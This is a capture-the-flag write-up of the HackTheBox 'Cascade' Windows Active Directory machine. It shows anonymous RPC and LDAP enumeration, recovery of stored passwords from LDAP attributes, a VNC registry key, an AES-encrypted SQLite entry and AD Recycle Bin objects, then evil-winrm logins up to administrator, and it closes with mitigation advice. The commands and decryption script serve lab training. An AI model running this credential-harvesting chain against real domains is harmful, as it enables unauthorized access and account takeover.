---
title: "HackTheBox - Cascade"
author: Nasrallah
description: ""
date: 2023-06-25 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, activedirectory, AD, msrpc, ldap, decompile, groups]
img_path: /assets/img/hackthebox/machines/cascade
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Cascade](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-28 09:42 +01                                                                                      [3/17325]
Nmap scan report for cascade.local (10.10.10.182)            
Host is up (0.15s latency).
                                                                               
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-28 08:42:19Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
4917/tcp  filtered unknown
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open     msrpc         Microsoft Windows RPC
49155/tcp open     msrpc         Microsoft Windows RPC
49157/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-08-28T08:43:15
|_  start_date: 2023-08-28T07:45:37
```

The target seems to be an Active directory domain controller.

### MSRPC

With `msrpc` service we can enumerate usernames if it allows for anonymous login.

```shell
$ rpcclient -U '' -N 10.10.10.182
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

Let's save the output to a file and use the following command to get a clean list of usernames.

```shell
cat RpcOutput.txt | cut -d "[" -f 2 | cut -d "]" -f 1 > users.lst
```

### LDAP

`LDAP` is a protocol that enable anyone to locate organizations, individuals and other resources such as files and devices in a network.

Using `ldapsearch`, let's run the following command to dump ldap data

```bash
ldapsearch -H 'ldap://cascade.local/' -x -b "dc=cascade,dc=local"
```

The output is very big so let's users information only by adding the following option to the query:

```bash
ldapsearch -H 'ldap://cascade.local/' -x -b "dc=cascade,dc=local" '(objectClass=person)'
```

Looking through the output we find the following extra line belonging to user `Ryan Thompson`.

```bash
cascadeLegacyPwd: clk0bjVldmE=
```

It looks like a base64 encoded string so let's decode it.

```bash
$ echo 'clk0bjVldmE=' | base64 -d
rY4n5eva  
```

We got `Ryan`'s password.

Tried to connect via `winrm` using this password but it didn't work.

### SMB

Let's see if we can list shares of SMB

```shell
$ crackmapexec smb cascade.local -u r.thompson -p "rY4n5eva" --shares                                                                                1 ⨯
SMB         cascade.local   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         cascade.local   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         cascade.local   445    CASC-DC1         [+] Enumerated shares
SMB         cascade.local   445    CASC-DC1         Share           Permissions     Remark
SMB         cascade.local   445    CASC-DC1         -----           -----------     ------
SMB         cascade.local   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         cascade.local   445    CASC-DC1         Audit$                          
SMB         cascade.local   445    CASC-DC1         C$                              Default share
SMB         cascade.local   445    CASC-DC1         Data            READ            
SMB         cascade.local   445    CASC-DC1         IPC$                            Remote IPC
SMB         cascade.local   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         cascade.local   445    CASC-DC1         print$          READ            Printer Drivers
SMB         cascade.local   445    CASC-DC1         SYSVOL          READ            Logon server share 
```

There is a share called `DATA` we have read permission over it.

Let's connect to the share

```bash
$ smbclient //cascade.local/Data -U r.thompson rY4n5eva                                                                                            130 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 27 04:27:34 2020
  ..                                  D        0  Mon Jan 27 04:27:34 2020
  Contractors                         D        0  Mon Jan 13 02:45:11 2020
  Finance                             D        0  Mon Jan 13 02:45:06 2020
  IT                                  D        0  Tue Jan 28 19:04:51 2020
  Production                          D        0  Mon Jan 13 02:45:18 2020
  Temps                               D        0  Mon Jan 13 02:45:15 2020

                6553343 blocks of size 4096. 1625424 blocks available
smb: \> mget *
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (2.8 KiloBytes/sec) (average 4.0 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (14.2 KiloBytes/sec) (average 7.1 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (5.6 KiloBytes/sec) (average 6.7 KiloBytes/sec)
smb: \> 
```

We found a bunch of files there and downloaded them using `mget *`.

Let's check what's on the files.

On `IT/Email Archives` we find the following email from Steve:

![](1.png)

On `IT/Temp/s.smith/VNC Install.reg` we find this line `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`.

I found this [github repository](https://github.com/frizb/PasswordDecrypts) showing how to decrypt this password using `metasploit`.

```shell
[msf](Jobs:0 Agents:0) >> irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> false
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"

```

We got the password of `s.smith`.

## **Foothold**

### WinRM

Using `evil-winrm` let's connect to the target.

```shell
$ evil-winrm -i cascade.local -u s.smith -p sT333ve2   

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> 
```

## **Privilege Escalation**

### s.smith --> ArkSvc

Let's see if user `s.smith` has anything interesting.

```shell
*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith
User name                    s.smith                                                                                                                          
Full Name                    Steve Smith                                                                                                                      
Comment                                                                                                                                                       
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

The user is part of a group called `Audit Share`, let's see what is this group

```shell
*Evil-WinRM* PS C:\Users\s.smith\Documents> net localgroup "Audit Share"
Alias name     Audit Share
Comment        \\Casc-DC1\Audit$

Members

-------------------------------------------------------------------------------
s.smith
The command completed successfully.
```

The comment above hint to the share `Audit`.

If we run `crackmapexec` we can see that we have read permissions on the share:

```shell
$ crackmapexec smb cascade.local -u s.smith -p sT333ve2 --shares
SMB         cascade.local   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         cascade.local   445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         cascade.local   445    CASC-DC1         [+] Enumerated shares
SMB         cascade.local   445    CASC-DC1         Share           Permissions     Remark
SMB         cascade.local   445    CASC-DC1         -----           -----------     ------
SMB         cascade.local   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         cascade.local   445    CASC-DC1         Audit$          READ            
SMB         cascade.local   445    CASC-DC1         C$                              Default share
SMB         cascade.local   445    CASC-DC1         Data            READ            
SMB         cascade.local   445    CASC-DC1         IPC$                            Remote IPC
SMB         cascade.local   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         cascade.local   445    CASC-DC1         print$          READ            Printer Drivers
SMB         cascade.local   445    CASC-DC1         SYSVOL          READ            Logon server share 
```

Let's connect to the share and download everything.

```shell
$ smbclient //cascade.local/Audit$ -U s.smith sT333ve2
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (19.0 KiloBytes/sec) (average 19.0 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (28.8 KiloBytes/sec) (average 22.7 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 17.9 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (369.4 KiloBytes/sec) (average 160.8 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (281.2 KiloBytes/sec) (average 186.7 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as DB/Audit.db (59.1 KiloBytes/sec) (average 171.6 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (500.5 KiloBytes/sec) (average 330.6 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (929.4 KiloBytes/sec) (average 429.5 KiloBytes/sec)
smb: \> 
```

We can see the file `RunAudit.bat` which runs `CascAudit.exe` with the file `"\\CASC-DC1\Audit$\DB\Audit.db"`.

```shell
$ cat RunAudit.bat 
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

The `Audit.db` is a `sqlite` db file.

```shell
$ file Audit.db                 
Audit.db: SQLite 3.x database, last written using SQLite version 3027002
```

![](2.png)

On the `ldap` table we find the username `ArkSvc` and what looks like a base64 encoded password, but when we try to decode it we fail.

Since this db file is being used by the executable `CascAudit.exe`, let's decompile it using `dnspy` maybe we can find how to decrypt it.

run `wine64 dnspy.exe` and open the `CascAudit.exe` file.

![](3.png)

We can see the code responsible for decoding the password.

The program is using a function called `Crypto.DecryptString` with the key  `c4scadek3y654321`, the function is not in the executable, maybe it's in the `.dll` file.

Let's open `CascCrypto.dll`

![](4.png)

To decrypt the password we can use the following python code:

```python
import pyaes
from base64 import b64decode

key = b"c4scadek3y654321"
iv = b"1tdyjCbY1Ix49842"
aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
print(decrypted.decode())
```

>Credits goes to HackTheBox team for this script, it can be found in the official writeup of Cascade.

```shell
$ python decode.py  
w3lc0meFr31nd
```

We got the password. let's login via `winrm`

```shell
$ evil-winrm -i cascade.local -u arksvc -p w3lc0meFr31nd

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> 
```

### arksvc --> Administrator

Let's see what groups this user is part of

```shell
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

We see `arksvc` is part of the group `AD Recycle Bin`.

This group gives permission to read deleted AD objects.

Let's list the deleted objects using the following command:

```shell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

```shell
[...]
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin                                                                                     
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059                                                                                    
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz                                                                                                        
CN                              : TempAdmin                                                                                                                   
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059                                                                                    
codePage                        : 0                                                                                                                           
countryCode                     : 0                                                                                                                           
Created                         : 1/27/2020 3:23:08 AM                                                                                                        
createTimeStamp                 : 1/27/2020 3:23:08 AM                                                                                                        
Deleted                         : True                                                                                                                        
Description                     :
[...]
```

We can see another `cascadeLegacyPwd` with the value `YmFDVDNyMWFOMDBkbGVz`, this was a temporary adminitrator password. Let's decode it.

```shell
$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d               
baCT3r1aN00dles
```

Now we can use the password to login as administrator via `winrm`

```shell
$ evil-winrm -i cascade.local -u administrator -p baCT3r1aN00dles

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```


## **Prevention and Mitigation**

### MSRPC prevention

The `msrpc` service was allowing anonymous login which permits us to enumerate domain users. We could've also enumerated more objects like `groups`, specific user info, display info and many more.

To prevent the enumeration you need to disable anonymous access to `msrpc`

### LDAP prevention

`LDAP` was allowing anonymous login as well so that should be disabled.

We were able to find a base64 encoded password. Passwords should never be stored in plaintext or reversible formats, instead they should be hashed using a strong and secure hashing algorithms.

### CascAudit.exe

On the `Audit` share we were able to find a sqlite db file that contained an encoded password. Since the password was being used by `CascAudit.exe` we were able to decompile the program and understand the decryption method used which allowed us to decrypt the password.

Again, passwords should never be stored in a reversible formats, they should be hashed using a strong and secure hashing algorithms.

### Ad Recycle Bin

As part of the `AD Recycle Bin` group, we were able to see deleted objects in the domain. With that we found the password of a deleted temporary admin account which the current administrator account uses.

Password should be stored in a hashed format and should never be reused.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).